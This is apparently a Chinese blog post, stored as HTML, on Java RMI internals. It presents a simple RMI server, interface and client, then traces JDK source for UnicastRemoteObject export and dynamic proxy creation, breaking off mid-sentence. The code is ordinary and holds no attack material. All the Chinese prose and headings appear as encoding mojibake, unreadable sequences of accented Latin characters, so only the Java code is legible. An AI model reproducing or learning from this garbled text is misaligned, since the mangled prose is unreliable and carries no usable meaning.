    <content><![CDATA[<h1 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h1><p>å…³äºJava RMI çš„å†…å®¹ååå¤å¤ä¹Ÿæ˜¯çœ‹äº†å¾ˆå¤šåˆ°äº†ï¼Œå®ƒåœ¨æˆ‘çš„æ—¥å¸¸å·¥ä½œä¸­æ›´å¤šçš„æ˜¯ä½œä¸ºä¸€ä¸ªçŸ¥è¯†ç‚¹è€Œå­˜åœ¨ï¼Œæ—¶ä¸æ—¶å°±å¾—æ‹¿å‡ºæ¥æ¸©ä¹ ä¸€ä¸‹ï¼Œæ—¶é—´ä¹…äº†å°±ä¼šè¢«é—å¿˜æ‰å…·ä½“çš„ç»†èŠ‚ã€‚<br>ä½†è¿™ä¸ªæ¦‚å¿µä¹Ÿç®—æ˜¯Javaæ¼æ´åˆ©ç”¨ä¸­çš„ä¸€ä¸ªæ˜æ˜Ÿæ¦‚å¿µä»¥åŠæœ‰ä¸€å®šå¤æ‚åº¦ä¸éš¾åº¦çš„çŸ¥è¯†ç‚¹äº†ï¼Œä¹Ÿæ˜¯é¢è¯•ä¸­çš„å¸¸å®¢ï¼ˆè™½ç„¶å·²ç»å¾ˆä¹…æ²¡æœ‰å‚åŠ é¢è¯•äº†ï¼Œä¸è¿‡æˆ‘æƒ³åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œæ¯•ç«ŸJavaå®‰å…¨çš„ä¸œè¥¿è¯´ç ´å¤©ä¹Ÿå°±é‚£ä¹ˆå¤šï¼‰  </p>
<h1 id="RMIä»‹ç»"><a href="#RMIä»‹ç»" class="headerlink" title="RMIä»‹ç»"></a>RMIä»‹ç»</h1><p>RMI é¡¾åæ€ä¹‰å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œç”¨æˆ·é€šè¿‡ä¸€äº›æŒ‡å®šæŸ¥æ‰¾è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡æ–¹æ³•å¹¶å®æ–½è°ƒç”¨ï¼Œæ¦‚å¿µæ˜¯å¾ˆæ¸…æ¥šçš„ï¼Œä½†å…¶å®ç°çš„æœºåˆ¶å´ä¸ç®€å•ã€‚<br>åœ¨Javaçš„RMIå®ç°ä¸­æ¶‰åŠåˆ°ä¸‰æ–¹æˆå‘˜ï¼Œå³è°ƒç”¨å®¢æˆ·ç«¯ï¼Œè¿œç¨‹æ³¨å†Œä¸­å¿ƒä»¥åŠè¿œç¨‹æœåŠ¡æä¾›è€…ã€‚è°ƒç”¨å®¢æˆ·ç«¯å¾ˆå®¹æ˜“ç†è§£å³RMIè°ƒç”¨çš„å‘èµ·è€…ï¼Œè¿œç¨‹æœåŠ¡æä¾›è€…ä¹Ÿä¸éš¾ç†è§£å³æä¾›RMIæœåŠ¡çš„ä¸»ä½“ï¼Œ<br>è¿œç¨‹æ³¨å†Œä¸­å¿ƒæƒ³å¿…ä¹Ÿå¹¶ä¸å¤æ‚å³è¿œç¨‹æœåŠ¡æä¾›è€…å°†å…¶èƒ½å¤Ÿæä¾›çš„æœåŠ¡æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒçš„æ³¨å†Œè¡¨ä¸­ä¾›è°ƒç”¨å®¢æˆ·ç«¯è¿›è¡ŒæŸ¥è¯¢ã€‚æˆ‘ä»¬æ¢ä¸ªæ›´åŠ é€šä¿—ä¸€ç‚¹çš„è¯´æ³•å¯èƒ½æ›´æ˜“ç†è§£ã€‚<br>å‡å¦‚æˆ‘æ˜¯ä¸€ä¸ªä¸­é—´å•†ï¼Œæˆ‘æä¾›çš„æœåŠ¡æ˜¯è”ç³»æ¶ˆè´¹è€…ä¸ä¾›åº”å•†ï¼Œæˆ‘è¿™é‡Œæœ‰ä¸€å¼ è¡¨ï¼Œè¿™å¼ è¡¨ä¸Šè®°å½•äº†æ¯ä¸ªä¾›åº”å•†æ‹¥æœ‰çš„å•†å“çš„ç±»å‹ä»¥åŠä»·æ ¼ç­‰ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯æˆ‘çš„æ ¸å¿ƒå•†ä¸šç§˜å¯†ï¼Œä¸€èˆ¬æ¶ˆè´¹è€…æ˜¯æ— æ³•è·å–åˆ°è¿™äº›ä¿¡æ¯çš„ã€‚<br>ä½ æ˜¯ä¸€ä¸ªå°å¸‚æ°‘ï¼Œå½“ç‰›åšé©¬10å¤šå¹´ç»ˆäºå‡‘å¤Ÿçš„æˆ¿å­çš„é¦–ä»˜æƒ³è¦è´­å…¥ä¸€å¥—æ–°æˆ¿ä½†æ˜¯ä½ ä¸çŸ¥é“è¦å‘è°è´­ä¹°ï¼Œä½ æœºç¼˜å·§åˆä¸‹æ‰¾åˆ°äº†æˆ‘è¿™ä¸ªä¸­é—´å•†ï¼Œæˆ‘å‘Šè¯‰ä½ æˆ‘è¿™é‡Œæœ‰å¾ˆå¤šæˆ¿åœ°äº§å•†çš„è”ç³»æ–¹å¼ï¼Œä½ åªéœ€è¦ä»˜ç»™æˆ‘10%æˆ¿ä»·çš„ä½£é‡‘ï¼ˆé»‘å¿ƒï¼‰<br>æˆ‘å°±æŠŠä»–ä»¬çš„è”ç³»æ–¹å¼å‘Šè¯‰ä½ ï¼Œä½ è™½ç„¶ä¸‡èˆ¬ä¸æ„¿ä½†ä¹Ÿæ²¡æœ‰æ›´å¥½çš„åŠæ³•åªèƒ½æ¥å—æˆ‘çš„å‰¥å‰Šï¼Œæˆ‘ä»¬çš„äº¤æ˜“æœ€ç»ˆè¾¾æˆï¼Œä½ æ‹¿ç€ä»æˆ‘è¿™é‡Œä¹°æ¥çš„è”ç³»æ–¹å¼æ‰¾åˆ°æˆ¿åœ°äº§å¼€å‘å•†è´­ä¹°å•†å“æˆ¿ã€‚<br>æœ€ç»ˆæˆ‘ä»¬å®ç°äº†ä¸‰èµ¢ï¼Œä½ ä¹°åˆ°äº†æˆ¿å­ï¼Œæˆ‘èµšäº†ä½£é‡‘ï¼Œæˆ¿åœ°äº§å¼€å‘å•†å¾—åˆ°äº†ç°é‡‘æµã€‚<br>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½ å°±æ˜¯è¿œç¨‹è°ƒç”¨è€…ï¼Œæˆ‘å°±æ˜¯æ³¨å†Œä¸­å¿ƒï¼Œæˆ¿åœ°äº§å¼€å‘å•†å°±æ˜¯æœåŠ¡æä¾›è€…ï¼Œæˆ‘ä»¬çš„å…³ç³»ä¹Ÿå°±æ˜¯RMIä¸­ä¸‰ä¸ªå…³é”®æ¦‚å¿µçš„å…³ç³»ã€‚  </p>
<h1 id="RMIè°ƒç”¨å®ä¾‹"><a href="#RMIè°ƒç”¨å®ä¾‹" class="headerlink" title="RMIè°ƒç”¨å®ä¾‹"></a>RMIè°ƒç”¨å®ä¾‹</h1><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œå…¶éœ€è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»å¹¶å®ç°ä¸€ä¸ª<code>Remote</code>ç±»çš„å­æ¥å£ã€‚<br>ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»æ˜¯ä¸ºäº†åœ¨åˆ›å»ºè¯¥è¿œç¨‹å¯¹è±¡å®ä¾‹çš„æ—¶å€™èƒ½å¤Ÿè°ƒç”¨åˆ°ç»§æ‰¿<code>UnicastRemoteObject</code>çš„æ„é€ æ–¹æ³•ä»è€Œå®Œæˆè¿œç¨‹å¯¹è±¡æœåŠ¡å™¨çš„ç›‘å¬ä»¥åŠå¯¹è±¡çš„å¯¼å‡ºï¼Œå½“ç„¶è¿™éƒ½æ˜¯åè¯ï¼Œåé¢ä¼šè¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚<br>å®ç°<code>Remote</code>å­æ¥å£æ˜¯å› ä¸ºè¯¥æ¥å£èµ·åˆ°ä¸€ä¸ªæ ‡å¿—ä½œç”¨ï¼Œè¡¨æ˜è¯¥å®ç°ç±»æ˜¯å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„ã€‚<br>è€Œè¿œç¨‹å¯¹è±¡ç±»ä¸ºä»€ä¹ˆå®ç°çš„æ˜¯<code>Remote</code>çš„å­ç±»è€Œä¸æ˜¯ç›´æ¥å®ç°<code>Remote</code>æ¥å£åˆ™æ˜¯å› ä¸ºè°ƒç”¨å®¢æˆ·ç«¯åœ¨è·å¾—è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„å­˜æ ¹å¯¹è±¡æ—¶å¾—åˆ°çš„æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¼šè¢«å®¢æˆ·ç«¯æ˜ å°„ä¸ºè¿œç¨‹çš„å¯¹è±¡ç›´æ¥è°ƒç”¨å…¶å¯¹åº”çš„æ–¹æ³•ï¼Œ<br>è€Œ<code>Remote</code>ç±»é»˜è®¤æ˜¯ä¸å­˜åœ¨è¿™äº›æ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¥å£å…ˆå°†è¿™äº›æ–¹æ³•è¿›è¡Œç”Ÿå‘½ä»¥ä¾¿è°ƒç”¨å®¢æˆ·ç«¯èƒ½å¤Ÿå¯¹è·å¾—çš„è¿œç¨‹å¯¹è±¡å­˜æ ¹è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬åœ¨å®¢æˆ·ç«¯çš„åˆ›å»ºä»£ç ä¸­å¯ä»¥çœ‹åˆ°ã€‚    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BindObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CustomRemote</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">BindObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ›å»º<code>Remote</code>æ¥å£çš„å­æ¥å£<code>CustomRemote</code><br>è¯¥æ¥å£å®šä¹‰äº†æ–¹æ³•<code>sayHello</code>ï¼Œè¯¥æ–¹æ³•ä¹Ÿå°±æ˜¯å¯ä»¥è¢«å®¢æˆ·ç«¯è°ƒç”¨çš„æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CustomRemote</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæ³¨å†Œä¸­å¿ƒ  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        <span class="type">BindObject</span> <span class="variable">bindObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BindObject</span>();</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ³¨å†Œä¸­å¿ƒ</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// ç»‘å®šè¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>, bindObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºè°ƒç”¨å®¢æˆ·ç«¯  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="comment">// è·å–åˆ°æ³¨å†Œä¸­å¿ƒçš„å­˜æ ¹</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡æ³¨å†Œä¸­å¿ƒå­˜æ ¹æ®è¿œç¨‹å¯¹è±¡åç§°æŸ¥è¯¢è¿œç¨‹å¯¹è±¡è·å–åˆ°è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">        <span class="comment">// è·å–åˆ°çš„æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡  æ¯ä¸€ä¸ªæ–¹æ³•çš„è°ƒç”¨éƒ½è¦é€šè¿‡invocationHandlerçš„invokeæ–¹æ³• è¿™å¾ˆé‡è¦</span></span><br><span class="line">        <span class="type">CustomRemote</span> <span class="variable">test</span> <span class="operator">=</span> (CustomRemote) registry.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨è¿œç¨‹å¯¹è±¡æ–¹æ³•</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> test.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="è¿œç¨‹æœåŠ¡æä¾›è€…æ˜¯å¦‚ä½•å¯åŠ¨çš„"><a href="#è¿œç¨‹æœåŠ¡æä¾›è€…æ˜¯å¦‚ä½•å¯åŠ¨çš„" class="headerlink" title="è¿œç¨‹æœåŠ¡æä¾›è€…æ˜¯å¦‚ä½•å¯åŠ¨çš„"></a>è¿œç¨‹æœåŠ¡æä¾›è€…æ˜¯å¦‚ä½•å¯åŠ¨çš„</h1><p>æˆ‘ä»¬åœ¨ <a href="#id_1">RMIè°ƒç”¨å®ä¾‹</a> ä¸­æåˆ°è¿‡è¿œç¨‹æœåŠ¡æä¾›è€…éœ€è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†èƒ½å¤Ÿè°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³•ä»è€Œå®Œæˆè¿œç¨‹å¯¹è±¡æœåŠ¡å™¨çš„ç›‘å¬ä»¥åŠå¯¹è±¡å¯¼å‡ºï¼Œæˆ‘ä»¬åˆ†æçš„èµ·ç‚¹ä¹Ÿå°±æ˜¯è¯¥ç±»çš„æ„é€ æ–¹æ³•ã€‚<br>æ­¤å¤„è°ƒç”¨äº†<code>UnicastRemoteObject</code>çš„æœ‰å‚æ„é€ æ–¹æ³•å¹¶ä¼ å…¥äº†ä¸€ä¸ªå‚æ•°<code>0</code>ï¼Œè¯¥å‚æ•°è¡¨ç¤ºç›‘å¬çš„ç«¯å£ï¼Œ<code>0</code>å³ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥è°ƒç”¨äº†<code>exportObject</code>æ–¹æ³•ï¼Œé¡¾åæ€ä¹‰è¿™æ˜¯ä¸€ä¸ªä¸è¿œç¨‹å¯¹è±¡å¯¼å‡ºæœ‰å…³çš„æ–¹æ³•ï¼Œå…¶æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥æˆ‘ä»¬å®ä¾‹åŒ–çš„è¿œç¨‹å¯¹è±¡æœ¬èº«ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç«¯å£ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>exportObject</code>æ–¹æ³•ç»§ç»­è°ƒç”¨äº†å…¶é‡è½½æ–¹æ³•ï¼Œè¯¥é‡è½½æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”±å¤–å±‚æ–¹æ³•è¿›è¡ŒåŸæ ·ä¼ é€’ï¼Œç¬¬äºŒä¸ªå‚æ•°è¢«å°è£…åˆ°<code>UnicastServerRef</code>å¯¹è±¡ä¸­ã€‚<br><code>UnicastServerRef</code>çš„å®ä¾‹å¯¹è±¡æ˜¯å¯¹è¿œç¨‹å¯¹è±¡æœåŠ¡å™¨çš„å¯åŠ¨æä¸ºé‡è¦çš„ä¸€ä¸ªç±»ï¼ŒåŒ…æ‹¬å¯¹è±¡å¯¼å‡ºçš„å…·ä½“é€»è¾‘ã€æ¥å—æ¶ˆæ¯çš„æ¶ˆæ¯åˆ†å‘éƒ½ä¸è¯¥ç±»æœ‰å…³ã€‚<br>æ­¤å¤„åœ¨è¿›è¡Œå®ä¾‹åŒ–çš„æ—¶å€™ä¸»è¦ä½œç”¨æ˜¯å°†<code>port</code>å‚æ•°å°è£…åˆ°<code>LiveRef</code>å®ä¾‹å¯¹è±¡ä¸­ï¼Œå¹¶å°†è¯¥LiveRefå®ä¾‹èµ‹å€¼ç»™<code>UnicastServerRef</code>çš„<code>ref</code>æˆå‘˜å˜é‡ã€‚<br>åœ¨<code>LiveRef</code>å¯¹è±¡ä¸­åˆ™ä¸»è¦æ˜¯é€šè¿‡<code>port</code>å‚æ•°åˆ›å»ºäº†æœåŠ¡å™¨ç›‘å¬çš„<code>Endpoint</code>å¯¹è±¡å¹¶å®ä¾‹åŒ–äº†ä¸€ä¸ª<code>ObjID</code>ç”¨äºå”¯ä¸€æ ‡è¯†æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡ã€‚<br>å…·ä½“çš„ä»£ç å°±ä¸æ”¾äº†ï¼Œå°±æ˜¯ä¸€äº›newä»¥åŠèµ‹å€¼æ“ä½œã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨é‡è½½çš„<code>exportObject</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆä¼šå¯¹è¾“å…¥çš„è¿œç¨‹å¯¹è±¡è¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œå¦‚æœå…¶ç»§æ‰¿äº†<code>UnicastRemoteObject</code>ç±»åˆ™å°†åˆšæ‰åˆ›å»ºçš„å•æ’­æœåŠ¡å¼•ç”¨<code>UnicastServerRef</code><br>è®¾ç½®åˆ°è¯¥å¯¹è±¡çš„<code>ref</code>æˆå‘˜å˜é‡ä¸­ã€‚ ç„¶åä¼šè°ƒç”¨<code>UnicastServerRef</code>çš„<code>exportObject</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>UnicastServerRef</code>çš„<code>exportObject</code>æ–¹æ³•ä¸­ï¼Œä¼šè·å–åˆ°æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡çš„<code>Class</code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨<code>Util.createProxy</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªå½“å‰æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡çš„åŠ¨æ€ä»£ç†å¯¹è±¡ã€‚<br>ç„¶ååˆ¤æ–­è¯¥ä»£ç†å¯¹è±¡æ˜¯å¦æ˜¯<code>RemoteStub</code>çš„å­ç±»ï¼Œå¦‚æœæ˜¯åˆ™ä¼šä¸ºå½“å‰æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡åˆ›å»ºä¸€ä¸ªå­˜æ ¹ã€‚æ¥ç€å°†è·å–åˆ°çš„ä»£ç†å¯¹è±¡å°è£…åˆ°<code>Target</code>å¯¹è±¡ä¸­ï¼Œå¹¶ç»§ç»­æ‰§è¡Œå¯¼å‡ºåŠ¨ä½œã€‚<br>åœ¨è¿›å…¥åˆ°åé¢åˆ°å¯¼å‡ºæ“ä½œå‰ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨åŠ¨æ€ä»£ç†å¯¹è±¡çš„åˆ›å»ºã€å­˜æ ¹å¯¹è±¡çš„åˆ›å»ºã€Targetå¯¹è±¡çš„åˆ›å»ºä»¥åŠåœ¨å¯¼å‡ºåçš„æ–¹æ³•hashè®¡ç®—çš„è¿‡ç¨‹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line"></span><br><span class="line">        Remote var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">        <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">        <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæˆ‘ä»¬å…³æ³¨åŠ¨æ€ä»£ç†å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹ï¼Œè¿™é‡Œä¼šè°ƒç”¨<code>Util.createProxy</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå½“å‰æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡çš„<code>Class</code>å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”±<code>getClientRef</code>æ–¹æ³•è·å–ï¼Œ<br>è¯¥æ–¹æ³•å°†å½“å‰<code>UnicastServerRef</code>çš„<code>ref</code>æˆå‘˜å˜é‡å°è£…åˆ°ä¸€ä¸ª<code>UnicastRef</code>å¯¹è±¡ä¸­ï¼Œä»åå­—ä¸­å¯ä»¥çœ‹å‡ºå¦‚æœ<code>UnicastServerRef</code>è¡¨ç¤ºæœåŠ¡ç«¯çš„å¼•ç”¨é‚£ä¹ˆ<code>UnicastRef</code>åˆ™è¡¨ç¤ºå®¢æˆ·ç«¯çš„å¼•ç”¨ï¼Œ<br>ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦å¼ºåˆ¶ä½¿ç”¨å­˜æ ¹ï¼Œé»˜è®¤ä¸º<code>false</code>ã€‚<br>è¿›å…¥åˆ°<code>createProxy</code>æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨<code>getRemoteClass</code>æ–¹æ³•è·å–ä¼ å…¥å‚æ•°çš„æ‰€æœ‰çˆ¶ç±»ä¸­ç›´æ¥å®ç°äº†<code>Remote</code>çš„å­æ¥å£çš„ç±»ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å‰é¢ä¸ç›´æ¥å®ç°<code>Remote</code>æ¥å£è€Œæ˜¯å…ˆåˆ›å»ºå…¶å­æ¥å£å†å®ç°çš„åŸå› ã€‚<br>åœ¨è°ƒç”¨<code>getRemoteClass</code>æ–¹æ³•æ—¶æˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>BindObject</code>çš„<code>Class</code>å¯¹è±¡ï¼Œå› ä¸º<code>BindObject</code>å®ç°äº†<code>Remote</code>çš„å­æ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥è¿”å›<code>BindObject</code>çš„<code>Class</code>å¯¹è±¡ã€‚<br>ç´§æ¥ç€ä¼šé‡åˆ°ä¸€ä¸ªåˆ¤æ–­ç»“æ„ï¼Œè¿™é‡Œé‡ç‚¹å…³æ³¨<code>stubClassExists</code>æ–¹æ³•çš„è¿è¡Œç»“æ„ï¼Œå› ä¸º<code>ignoreStubClasses</code>é»˜è®¤ä¸º<code>false</code>ï¼Œæ ¹æ®è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§<code>and</code>ä¼šä¼˜å…ˆäº<code>or</code>æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ¤æ–­ç»“æœå–å†³äº<code>stubClassExists</code>çš„è¿ç®—ç»“æœã€‚<br><code>stubClassExists</code>æ–¹æ³•ä¼šåˆ¤æ–­ä¼ å…¥çš„<code>var3</code>çš„ç±»åæ‹¼æ¥<code>_Stub</code>ä½œä¸ºæ–°çš„ç±»åçš„ç±»æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›<code>true</code>ï¼Œè‹¥ä¸å­˜åœ¨åˆ™è¿”å›<code>false</code>ã€‚<br>æ­¤å¤„æˆ‘ä»¬ä¼ å…¥çš„æ˜¯è‡ªå®šä¹‰çš„ç±»ï¼Œå¾ˆæ˜æ˜¾å…¶å­˜æ 